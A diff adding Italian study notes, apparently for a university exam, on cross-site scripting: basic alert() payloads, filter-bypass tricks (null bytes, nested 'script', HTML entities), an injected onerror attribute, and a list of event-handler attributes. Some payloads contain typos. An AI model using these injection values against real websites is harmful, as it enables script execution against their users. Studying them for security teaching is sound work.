@@ -1,0 +1,58 @@
+## WEB XSS ##
+
+-----------
+-la presenza di un campo di input può essere usato per XSS
+-OBBIETTIVO: cerchiamo di inserire codice (javascript)
+-esempio tipico: <script>alert("XSS")</script>
+-----------
+
+----------
+-inseriamo qualcosa nel form e verifichiamo l'output
+-cerco di capire come sfruttare l'output
+-input filtrato! come raggirarlo?
+----------
+
+---passare la sostituzione:
+
+##esempio-sostituzione di 'script'?
+	
+	uso di caratteri nulli: %00
+	<scrip%00t>alert("XSS")</scrip/00t>
+	
+	uso caratteri intermedi e spezzo 'script'
+	<scripscriptt>alert("XSS")</scripscriptt>
+	
+##esempio-sostituzione di < >?
+	
+	possiamo usare codifiche alternative:
+
+	HTML Entities
+	&#60;script#62;alert('XSS')&#60;/script#62;
+
+------------
+
+	
+
+esempio esame 10 febbraio XSS:
+
+## SFRUTTARE L'OUTPUT A NOSTRO VANTAGGIO: #######
+input: ciao
+output: <img src="ciao"> 
+
+prova a far apparire l'immagine sulla pagina web
+notiamo su terminale 404 file not found
+
+-soluzione
+input: " onerror="alert('XSS')
+output: <img src="" onerror="alert('XSS')"> --> attiva ALERT
+
+## 
+
+
+usare gli attributi HTML
+<img> --> onerror="" | eseguito se non trova src
+<body> --> onload=""
+<iframe> --> onerror=""
+<input> --> onfocus=""
+<div> --> onmouseover=""
+
